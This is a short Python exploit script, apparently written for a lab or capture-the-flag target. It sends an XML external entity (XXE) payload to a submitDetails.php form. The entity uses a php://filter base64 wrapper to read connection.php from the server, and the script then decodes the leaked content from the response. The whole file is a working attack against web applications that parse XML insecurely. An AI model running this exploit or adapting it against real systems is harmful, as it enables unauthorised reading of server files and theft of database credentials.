#!/usr/bin/python3

import re
from pwn import *
import requests
import base64
import sys
from pprint import pprint


def xxe_exploit(url):
    log.progress("Loading payload to XXE")


    headers = {
        "Content-Type":"application/xml"
    }

    payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
<root>
<name>arturo</name>
<tel>5656</tel>
<email>&company;</email>
<message>test</message>
</root>"""

    log.info("generating session")
    sess = requests.session()
    # sess.get(url=url).headers

    log.info("sending payloads")
    ress = sess.post(url=url+"submitDetails.php",data=payload)

    code = re.findall(r'Check your email (.*) for further instructions', ress.text)[0]
    
    decoded = base64.b64decode(code.encode()).decode()
    print(decoded)

def main():

    url = sys.argv[1]
    xxe_exploit(url)




if __name__ == "__main__":
    main()
